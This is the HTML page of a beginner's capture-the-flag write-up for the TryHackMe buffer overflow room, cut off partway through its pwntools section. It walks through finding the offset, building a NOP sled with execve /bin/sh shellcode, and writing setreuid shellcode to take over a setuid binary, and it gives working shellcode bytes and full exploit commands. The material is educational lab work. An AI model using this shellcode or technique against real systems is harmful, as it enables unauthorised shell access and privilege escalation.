<!doctype html>
<html lang="en-us">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
  <meta name="robots" content="noodp,noydir">
  <meta name="pinterest" content="nopin">

  <link rel="icon" type="image/png" sizes="32x32" href="https://l1ge.github.io/image/brand/favicon.png">
  <link rel="icon" type="image/x-icon" href="https://l1ge.github.io/favicon.ico">
  <link rel="apple-touch-icon" href="https://l1ge.github.io/image/brand/icon-1-1.png">
  <link rel="canonical" href="https://l1ge.github.io/tryhackme_bof1/">
  
<link rel="preload" as="style" href="https://l1ge.github.io/bundle.css?v=1650722515" media="all">
<link rel="stylesheet" href="https://l1ge.github.io/bundle.css?v=1650722515" media="all">

<link rel="preload" as="image" href="https://l1ge.github.io/image/lettherightonein2.jpg">


<title>TryHackMe - Buffer Overflows (Bof1)  Task 8  - Write-up : l1ge&#39;s cabin</title>

<meta property="og:title" content="TryHackMe - Buffer Overflows (Bof1)  Task 8  - Write-up">
<meta property="og:site_name" content="l1ge&#39;s cabin">
<meta property="og:url" content="https://l1ge.github.io/tryhackme_bof1/">
<link rel="image_src" href="https://l1ge.github.io/image/lettherightonein2.jpg">
<meta property="og:image" content="https://l1ge.github.io/image/lettherightonein2.jpg">
<meta property="og:image:width" content="700">
<meta property="og:image:height" content="302">
<meta property="og:type" content="article">
<meta property="og:locale" content="en_us">
<meta property="og:description" content="0x0 About the room  Access: https://tryhackme.com/room/bof1  Many people have been complaining about the difficulty of this room (rated as easy...) and the opacity of the instructions. I did too. It&#39;s supposed to be for beginners but the author assume you know how to use a disassembler and the shell code he gives you doesn&#39;t work so you eventually have to code your own.">
<meta name="description" content="0x0 About the room  Access: https://tryhackme.com/room/bof1  Many people have been complaining about the difficulty of this room (rated as easy...) and the opacity of the instructions. I did too. It&#39;s supposed to be for beginners but the author assume you know how to use a disassembler and the shell code he gives you doesn&#39;t work so you eventually have to code your own.">
<meta property="og:updated_time" content="2020-05-19T13:00:00Z">
<meta property="fb:app_id" content="">
<meta name="author" content="l1ge">
<meta property="article:author" content="https://l1ge.github.io">
<meta property="article:published_time" content="2020-05-19T13:00:00Z">
<meta property="article:modified_time" content="2020-05-19T13:00:00Z">
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "Article",
  "headline": "TryHackMe - Buffer Overflows (Bof1)  Task 8  - Write-up",
  "alternativeHeadline": "The room that makes you feel you're in the buffer.",
  "url": "https://l1ge.github.io/tryhackme_bof1/",
  "image": "https://l1ge.github.io/image/lettherightonein2.jpg",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://l1ge.github.io/tryhackme_bof1/"
  },
  "description": "0x0 About the room  Access: https://tryhackme.com/room/bof1  Many people have been complaining about the difficulty of this room (rated as easy...) and the opacity of the instructions. I did too. It's supposed to be for beginners but the author assume you know how to use a disassembler and the shell code he gives you doesn't work so you eventually have to code your own.",
  "author": {
    "@type": "Person",
    "name": "l1ge"
  },
  "publisher": {
    "@type": "Organization",
    "name": "l1ge's cabin",
    "logo": {
      "@type": "ImageObject",
      "url": "https://l1ge.github.io/image/brand/icon-1-1.png"
    }
  },
  "datePublished": "2020-05-19T13:00:00Z",
  "dateModified": "2020-05-19T13:00:00Z",
  "articleBody": "\u003ch1\u003e0x0 About the room\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003eAccess: \u003ca href=\"https://tryhackme.com/room/bof1\"\u003ehttps://tryhackme.com/room/bof1\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eMany people have been complaining about the difficulty of this room (rated as easy...) and the opacity of the instructions. I did too. It's supposed to be for beginners but the author assume you know how to use a disassembler and the shell code he gives you doesn't work so you eventually have to code your own.\u003c/p\u003e\n\u003cp\u003eAnyway, when I realized all that, I had already spent too much time to give up. It took me a few days to get the flags but I learned a lot.\u003c/p\u003e\n\u003cp\u003eSpecial thanks to rennox and tkiela who kept me on the surface when I was getting overflowed.\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eDisclaimer: I am a beginner,  this was my first buffer overflow and the first time I had to use gdb...Contact me if anything I say is incorrect.\u003c/em\u003e\u003c/p\u003e\n\u003ch1\u003e0x1 Finding the offset\u003c/h1\u003e\n\u003cp\u003eAs explained in the instruction, the first step is to find the amount of bytes you need to fill in order to overwrite the return address.\u003c/p\u003e\n\u003ch2\u003eMethod 1: The manual way\u003c/h2\u003e\n\u003cp\u003eBecause we have access to she source code, we know the allocated memory for the buffer is at least 140 bytes. But between the 140th byte and the return address there is a gap filled with some \u0026quot;\u003ca href=\"http://www.songho.ca/misc/alignment/dataalign.html\"\u003ealignment bytes\u003c/a\u003e\u0026quot; and by the rbp register (aka saved register) , which is 8 bytes in x64 architecture.\u003c/p\u003e\n\u003cp\u003eThe offset will look like this : buffer(140 bytes) + Alignment bytes (?) + rbp (8 bytes).\u003c/p\u003e\n\u003cp\u003eSo we know the offset will be at least 148 bytes long. To get the exact offset, we will fill the buffer with the letter 'A'  (\\x41 in hex) until we start to see our 'As' overwriting the return address. I'll use gdb which I found easier to use than r2 for beginners.\u003c/p\u003e\n\u003cp\u003eOpen gdb on your binary \u003ccode\u003e$ gdb buffer-overflow\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eLet's start with 148  'A'.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e(gdb) run $(python -c \u0026quot;print('A'*148)\u0026quot;)\n\nStarting program: $(python -c \u0026quot;print('A'*148)\u0026quot;)\nMissing separate debuginfos, use: debuginfo-install glibc-2.26-32.amzn2.0.1.x86_64\nHere's a program that echo's out your input\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000000400595 in main ()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe last line contain the return address \u003ccode\u003e0x0000000000400595\u003c/code\u003e. As we can see, there are no '41' so we didn't override it. Let's increase to 155\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e(gdb) run $(python -c \u0026quot;print('A'*155)\u0026quot;)\nHere's a program that echo's out your input\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000000414141 in ?? ()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe start to see that we're overwriting the return address.  I kept increasing and went too far after 159.\u003c/p\u003e\n\u003cp\u003e158 is  the right amount, which override perfectly the return address with 6 bytes.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e(gdb) run $(python -c \u0026quot;print('\\x41'*158)\u0026quot;)\nHere's a program that echo's out your input\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000414141414141 in ?? ()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSo we know that with 158 bytes we override the 6-bytes-long return address. It means our offset to reach the start of the return address is 158-6 = \u003cstrong\u003e152\u003c/strong\u003e\u003c/p\u003e\n\u003ch2\u003eMethod 2 : With Metasploit's tool\u003c/h2\u003e\n\u003cp\u003eWe create a pattern of a random length with the tool \u003ccode\u003epattern_create.rb\u003c/code\u003e from  Metasploit's framework. Let's try a 200 bytes pattern.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e┌─[✗]─[l1ge@parrot]─[~]\n└──╼$/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe copy that pattern and run the binary in gdb with it\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e(gdb) run 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'\n\nHere's a program that echo's out your input\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000000400563 in copy_arg ()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eDespite the overflow, the return address doesn't show our pattern. We have to search it somewhere else, in the rbp register instead (remember? the rbp comes just before the return address)\u003c/p\u003e\n\u003cp\u003eWe do that with the command \u003ccode\u003ei r\u003c/code\u003e to show all the registers\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e(gdb) i r\nrax            0xc9\t201\nrbx            0x0\t0\nrcx            0x7ffff7b08894\t140737348929684\nrdx            0x7ffff7dd48c0\t140737351862464\nrsi            0x602260\t6300256\nrdi            0x0\t0\nrbp            0x6641396541386541\t0x6641396541386541  \u0026lt;-------HERE IS THE PATTERN\nrsp            0x7fffffffe2b8\t0x7fffffffe2b8\nr8             0x7ffff7fef4c0\t140737354069184\nr9             0x77\t119\nr10            0x5e\t94\nr11            0x246\t582\nr12            0x400450\t4195408\nr13            0x7fffffffe3b0\t140737488348080\nr14            0x0\t0\nr15            0x0\t0\nrip            0x400563\t0x400563 \u0026lt;copy_arg+60\u0026gt;\neflags         0x10206\t[ PF IF RF ]\ncs             0x33\t51\nss             0x2b\t43\nds             0x0\t0\nes             0x0\t0\nfs             0x0\t0\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe see that the rbp has been overridden with the pattern. We then use metasploit's  \u003ccode\u003epattern-offset.rb\u003c/code\u003e to query the pattern we found in the rbp\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e┌─[✗]─[l1ge@parrot]─[~]\n└──╼$/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 6641396541386541\n[*] Exact match at offset 144\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIt says that our rbp starts with an offset of 144. We know the rbp is 8 bytes so 144+8 = \u003cstrong\u003e152\u003c/strong\u003e. The offset we manually found is confirmed.\u003c/p\u003e\n\u003ch1\u003e0x2 Picking a shell code\u003c/h1\u003e\n\u003cp\u003eWe need a shell code that we will put in our buffer and have the return address points to it. For now I just want a simple shell code, just to drop a shell.\u003c/p\u003e\n\u003cp\u003eThere are a few on exploit-db like \u003ca href=\"https://www.exploit-db.com/exploits/41750\"\u003ethis one\u003c/a\u003e or \u003ca href=\"https://www.exploit-db.com/exploits/42179\"\u003ethat one\u003c/a\u003e. But I wont make you waste your time like I wasted mine. I've tried most of these simple shell codes and most of them didn't work on our case.  I was getting SIGILL errors all the time.\u003c/p\u003e\n\u003cp\u003eI later found out why: These short shell codes don't have an exit function call at their end, it means that once I injected these shell codes in the buffer and mess up the memory, the binary was still trying to execute these messed up instructions and thus, was reporting \u0026quot;illegal instruction error\u0026quot;.\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eSide note : I was able to get a shell with these simple shell codes but only by using another method : an env variable. With this method you don't put your shell code in the buffer but in an environment variable and then you give the return address the address of that variable. That way you don't mess up the memory and I didn't get any error.\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eSo bellow is a similar simple shell code that i found but it includes an exit call at the end that will prevent the SIGILL errors.\u003c/p\u003e\n\u003cp\u003eThe assembly version:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-assembly\"\u003e    push $0x3b\n    pop %eax\n    xor %rdx,%rdx\n    movabs $0x68732f6e69622f2f,%r8  \n    shr $0x8, %r8                   \n    push %r8\n    mov %rsp, %rdi\n    push %rdx\n    push %rdi\n    mov %rsp, %rsi\n    syscall\t\t\t\t \u0026lt;------ from the top to this point it's too execute /bin/sh\n    push $0x3c\n    pop %eax\n    xor %rdi,%rdi\n    syscall \t\t\t\u0026lt;------ The last 4 lines are for the exit function.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe hex version:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-shell\"\u003e\\x6a\\x3b\\x58\\x48\\x31\\xd2\\x49\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe8\\x08\\x41\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\\x6a\\x3c\\x58\\x48\\x31\\xff\\x0f\\x05\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis shell code is 40 bytes . I'll cover more about shell codes in the last part of this write up.\u003c/p\u003e\n\u003ch1\u003e0x3 Finding the address of the shell code\u003c/h1\u003e\n\u003cp\u003eOur payload will be 158 bytes in total : 152 to fill the buffer and 6 to override the return address pointing to the address of the shell code in the buffer.\u003c/p\u003e\n\u003cp\u003ePAYLOAD = JUNK(100 bytes) + SHELL CODE (40 bytes) + JUNK (12 byes) + RETURN ADDRESS (6 bytes).\u003c/p\u003e\n\u003cp\u003eThere are no specific reason why I put 100 bytes before and 12 bytes after the shell code. You can try different things as long as the total without the return address is 152.\u003c/p\u003e\n\u003cp\u003eLet's fill the junk with 'A's for now, and our return address with 6*'B'\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-shell\"\u003e(gdb) run $(python -c \u0026quot;print 'A'*100+'\\x6a\\x3b\\x58\\x48\\x31\\xd2\\x49\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe8\\x08\\x41\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\\x6a\\x3c\\x58\\x48\\x31\\xff\\x0f\\x05' + 'A'*12 + 'B'*6\u0026quot;)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe will now examine the dump of the hex code with the command \u003ccode\u003ex/100x $rsp-200\u003c/code\u003e which dumps 100*4 bytes from memory location $rsp -200 bytes.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e(gdb) x/100x $rsp-200\n0x7fffffffe228:\t0x00400450\t0x00000000\t0xffffe3e0\t0x00007fff\n0x7fffffffe238:\t0x00400561\t0x00000000\t0xf7dce8c0\t0x00007fff\n0x7fffffffe248:\t0xffffe64d\t0x00007fff\t0x41414141\t0x41414141 \u0026lt;--- start of the buffer\n0x7fffffffe258:\t0x41414141\t0x41414141\t0x41414141\t0x41414141\n0x7fffffffe268:\t0x41414141\t0x41414141\t0x41414141\t0x41414141\n0x7fffffffe278:\t0x41414141\t0x41414141\t0x41414141\t0x41414141\n0x7fffffffe288:\t0x41414141\t0x41414141\t0x41414141\t0x41414141\n0x7fffffffe298:\t0x41414141\t0x41414141\t0x41414141\t0x41414141\n0x7fffffffe2a8:\t0x41414141\t0x41414141\t0x41414141\t0x48583b6a \u0026lt;--- start of the shellcode\n0x7fffffffe2b8:\t0xb849d231\t0x69622f2f\t0x68732f6e\t0x08e8c149\n0x7fffffffe2c8:\t0x89485041\t0x485752e7\t0x050fe689\t0x48583c6a\n0x7fffffffe2d8:\t0x050fff31\t0x41414141\t0x41414141\t0x41414141\n0x7fffffffe2e8:\t0x42424242\t0x00004242\t0xffffe3e8\t0x00007fff\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe see all the 41 that we filled the buffer with. And then we see our shell code.\u003c/p\u003e\n\u003cp\u003eTo calculate the exact address where the shell code starts,  you first  take the memory address on the left on the same line : 0x7fffffffe2a8. This is the address of the first column on this line (filed with 41 at the moment). And then you add 4 bytes per column. Our shell code is 3 columns further so you need to add 3*4= 12 bytes to that address.\u003c/p\u003e\n\u003cp\u003eIn hex 12 is 0xC, you need to do 0x7fffffffe2a + 0xC = 0x7fffffffe2b4\u003c/p\u003e\n\u003cp\u003eWe now got the exact address where the shell code start in the buffer, so we could override the return address with it and it should work.  But sometimes memory shift a bit, from one execution to another the address might change. That's why we use NOPs\u003c/p\u003e\n\u003ch2\u003eNOPs\u003c/h2\u003e\n\u003cp\u003eInstead of filling the junk before the shell code with 'A'  we fill it with NOPs (\\x90).\u003c/p\u003e\n\u003cp\u003eThe NOPs are instructions to do nothing, they will be skipped. It means that now, you don't need to get the exact address where your shell code start but any address in the NOPS, the program will skip all the NOPS and execute your shell code. That way if the memory shift a bit, your exploit will still work.\u003c/p\u003e\n\u003cp\u003eLet's replace the 'A's with NOPs and dump our hex again.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e(gdb) run $(python -c \u0026quot;print '\\x90'*100+'\\x6a\\x3b\\x58\\x48\\x31\\xd2\\x49\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe8\\x08\\x41\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\\x6a\\x3c\\x58\\x48\\x31\\xff\\x0f\\x05' + 'A'*12 + 'B'*6\u0026quot;)\n\nHere's a program that echo's out your input\n����������������������������������������������������������������������������������������������������j;XH1�I�//bin/shI�APH��RWH��j\u0026lt;XH1�AAAAAAAAAAAABBBBBB\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000424242424242 in ?? ()\n\n(gdb) x/100x $rsp-200\n0x7fffffffe228:\t0x00400450\t0x00000000\t0xffffe3e0\t0x00007fff\n0x7fffffffe238:\t0x00400561\t0x00000000\t0xf7dce8c0\t0x00007fff\n0x7fffffffe248:\t0xffffe64d\t0x00007fff\t0x90909090\t0x90909090 \u0026lt;----- Nops start here\n0x7fffffffe258:\t0x90909090\t0x90909090\t0x90909090\t0x90909090\n0x7fffffffe268:\t0x90909090\t0x90909090\t0x90909090\t0x90909090\n0x7fffffffe278:\t0x90909090\t0x90909090\t0x90909090\t0x90909090\n0x7fffffffe288:\t0x90909090\t0x90909090\t0x90909090\t0x90909090\n0x7fffffffe298:\t0x90909090\t0x90909090\t0x90909090\t0x90909090 \u0026lt;----- The address I pick\n0x7fffffffe2a8:\t0x90909090\t0x90909090\t0x90909090\t0x48583b6a \u0026lt;----- shellcode\n0x7fffffffe2b8:\t0xb849d231\t0x69622f2f\t0x68732f6e\t0x08e8c149\n0x7fffffffe2c8:\t0x89485041\t0x485752e7\t0x050fe689\t0x48583c6a\n0x7fffffffe2d8:\t0x050fff31\t0x41414141\t0x41414141\t0x41414141\n0x7fffffffe2e8:\t0x42424242\t0x00004242\t0xffffe3e8\t0x00007fff\n0x7fffffffe2f8:\t0x00000000\t0x00000002\t0x004005a0\t0x00000000\n0x7fffffffe308:\t0xf7a4302a\t0x00007fff\t0x00000000\t0x00000000\n0x7fffffffe318:\t0xffffe3e8\t0x00007fff\t0x00040000\t0x00000002\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eYou can now just pick any  address as long as its in the NOPS, I'll pick 0x7fffffffe298.\u003c/p\u003e\n\u003cp\u003eWe need to convert it to little endian:\u003c/p\u003e\n\u003cp\u003e0x7fffffffe298 becomes 0x98e2ffffff7f and eventually \\x98\\xe2\\xff\\xff\\xff\\x7f\u003c/p\u003e\n\u003cp\u003eNow let's try to get a shell! We replace the last 6 bytes that were just 6*'B', by this address.\u003c/p\u003e\n\u003cp\u003eLet's run it outside gdb to be sure we're in the good environment.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ ./buffer-overflow $(python -c \u0026quot;print '\\x90'*100+'\\x6a\\x3b\\x58\\x48\\x31\\xd2\\x49\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe8\\x08\\x41\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\\x6a\\x3c\\x58\\x48\\x31\\xff\\x0f\\x05' + 'A'*12 + '\\x98\\xe2\\xff\\xff\\xff\\x7f'\u0026quot;)\n\nHere's a program that echo's out your input\n����������������������������������������������������������������������������������������������������j;XH1�I�//bin/shI�APH��RWH��j\u0026lt;XH1�AAAAAAAAAAAA�����\nsh-4.2$\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eYeay ! We're in !\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003esh-4.2$ whoami\nuser1\nsh-4.2$ cat secret.txt\ncat: secret.txt: Permission denied\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAww...As we can see, we're only user1. And we can't access the secret file. Let's look at the permissions.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ ls -l\ntotal 20\n-rwsrwxr-x 1 user2 user2 8264 Sep  2  2019 buffer-overflow\n-rw-rw-r-- 1 user1 user1  285 Sep  2  2019 buffer-overflow.c\n-rw------- 1 user2 user2   22 Sep  2  2019 secret.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSecret.txt can only be read by user 2, ok we knew that. But the buffer-overflow binary has the the setuid bit (the 's' in the permissions), so I expected that dropping a shell would  give me user2's privileges!  It's not the case and I'll explain why.\u003c/p\u003e\n\u003ch1\u003e0x4 About Setuid, Setreuid\u003c/h1\u003e\n\u003cp\u003eThere are two main reasons why we're not user2:\u003c/p\u003e\n\u003cp\u003eFirst, for security reasons,  the setuid bit is given only when it's necessary. As I understood it, you would have to add in the shell code a function that says \u0026quot;now its necessary to give setuid(UID) to run the next command\u0026quot;.  So I first tried to do just that.\u003c/p\u003e\n\u003cp\u003eI looked for user's 2 UID\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\n.\n.\nuser1:x:1001:1001::/home/user1:/bin/bash\nuser2:x:1002:1002::/home/user2:/bin/bash  \nuser3:x:1003:1003::/home/user3:/bin/bash\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe can see the UID of user2 is 1002. And I looked for a way to add the function \u003ccode\u003esetuid(1002)\u003c/code\u003e at the top of my shell code and thus become user2 in the shell.\u003c/p\u003e\n\u003cp\u003eBut... that didn't work. Which takes me to the second reason:\u003c/p\u003e\n\u003cp\u003eWhen you drop the shell, /bin/sh looks at your \u003cstrong\u003ereal\u003c/strong\u003e UID and not your \u003cstrong\u003eeffective\u003c/strong\u003e UID. You can do research about the difference between real and effective UID but mostly, the funtion setuid(), except if its called on root, only sets your effective UID.  So even if we call setuid(1002), our real UID would still be 1001 and thus we'll remain user1 in the shell.  We need to use another function: \u003ca href=\"http://man7.org/linux/man-pages/man2/setreuid.2.html\"\u003esetreuid()\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eSide note: Most of the time in these exploits, we want to become root and we target binaries who have the setuid-root bit. In that case, simply doing setuid(0) would work because when called on root, setuid(0) also sets you real UID to root.\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003esetreuid() can set both your real and effective uid.  So we need to modify our shell code to execute setreuid(1002,1002) before it executes /bin/sh. And that mean, coding in assembly : Yeeay!\u003c/p\u003e\n\u003ch1\u003e0x5 Modifying the shell code\u003c/h1\u003e\n\u003cp\u003eDepending on your knowledge in assembly and in C, there are different ways to approach it:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eYou can write your shellcode in C, compile it, look at the assembly code, remove the bad characters and use it in your exploit.\u003c/li\u003e\n\u003cli\u003eYou can go straight to assembly, find an existing shell code that uses setreuid() and modify it.\u003c/li\u003e\n\u003cli\u003eThe easiest option : you can use \u003ca href=\"http://docs.pwntools.com/en/stable/\"\u003epwntools\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003eManually\u003c/h2\u003e\n\u003cp\u003eI personally did the 2nd option before i realized pwntools would have been easier. If you're in a hurry go straight to that part bellow.\u003c/p\u003e\n\u003cp\u003eI grabbed \u003ca href=\"http://shell-storm.org/shellcode/files/shellcode-77.php\"\u003ethis shell code\u003c/a\u003e that setuid(0) , drops a shell and exits. I went to an IRC assembly channel and asked for help to modify it.\u003c/p\u003e\n\u003cp\u003eFirst my goal was to setuid(1002), someone helped me to do that. But as I said above, it wasn't enough to become user2. Then I was able to modify it to call setreuid() instead of setuid().  I had to look for the function's %rax number in this \u003ca href=\"https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/\"\u003eLinux System Call Table\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003esetreuid()'s rax number is 113 ( 0x71 in hex).  And it takes its two arguments from the rdi and rsi registers.\u003c/p\u003e\n\u003cp\u003eHere was my assembly code in the end:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-assembly\"\u003exor    rdi,rdi\t\t\t\u0026lt;------ set the rdi to 0\nxor    rax,rax\t\t\nxor    rsi, rsi    \t\t\u0026lt;------ set the rsi to 0\nmov    si, 1002  \t    \u0026lt;------ put the value 1002 in the lower bits of the rsi\nmov    di, 1002\t\t\t\u0026lt;------ put the value 1002 in the lower bits of the rdi\nmov    al,0x71\t\t\t\u0026lt;------ put the setruid function in the al register      \nsyscall\t\t\t\t\t\u0026lt;------ call the function.\nxor    rdx,rdx\nmovabs rbx,0x68732f6e69622fff\nshr    rbx,0x8\npush   rbx\nmov    rdi,rsp\nxor    rax,rax\npush   rax\npush   rdi\nmov    rsi,rsp\nmov    al,0x3b\nsyscall\npush   0x1\npop    rdi\npush   0x3c\npop    rax\nsyscall\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAnd I converted it to hex using \u003ca href=\"https://defuse.ca/online-x86-assembler.htm\"\u003eOnline Assembly\u003c/a\u003e .\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-shell\"\u003e\\x48\\x31\\xFF\\x48\\x31\\xC0\\x48\\x31\\xF6\\x66\\xBE\\xEA\\x03\\x66\\xBF\\xEA\\x03\\xB0\\x71\\x0F\\x05\\x48\\x31\\xD2\\x48\\xBB\\xFF\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x48\\xC1\\xEB\\x08\\x53\\x48\\x89\\xE7\\x48\\x31\\xC0\\x50\\x57\\x48\\x89\\xE6\\xB0\\x3B\\x0F\\x05\\x6A\\x01\\x5F\\x6A\\x3C\\x58\\x0F\\x05\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eBut if you don't want to bother with trying to understand assembly, there is a much easier way.\u003c/p\u003e\n\u003ch2\u003eWith Pwntools\u003c/h2\u003e\n\u003cp\u003eYou can use \u003ca href=\"http://docs.pwntools.com/en/stable/\"\u003epwntools\u003c/a\u003e and its shellcraft module to generate shellcodes for you. We already have a working shell code to get a shell, so we just need to add to it the setreuid() part.\u003c/p\u003e\n\u003cp\u003eInstall pwntools following the instruction on their site. Then run:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e┌─[✗]─[l1ge@parrot]─[~]\n└──╼$pwn shellcraft -f d amd64.linux.setreuid 1002\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e-f d\u003c/code\u003e sets the format to \u0026quot;escaped\u0026quot;.  You can set \u003ccode\u003e-f a\u003c/code\u003e to look at the assembly version\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eSide note: It would also work if you don't specify the UID 1002 .  It would automatically grab the effective UID with geteuid() and set it as your Real UID. But I keep it that way to make things clearer.\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eYou get you the following shellcode\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-shell\"\u003e\\x31\\xff\\x66\\xbf\\xea\\x03\\x6a\\x71\\x58\\x48\\x89\\xfe\\x0f\\x05\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe just have to paste it in front of our working shell code from section 0x2. The result it:\u003c/p\u003e\n\u003cpre\u003e\u003ccode 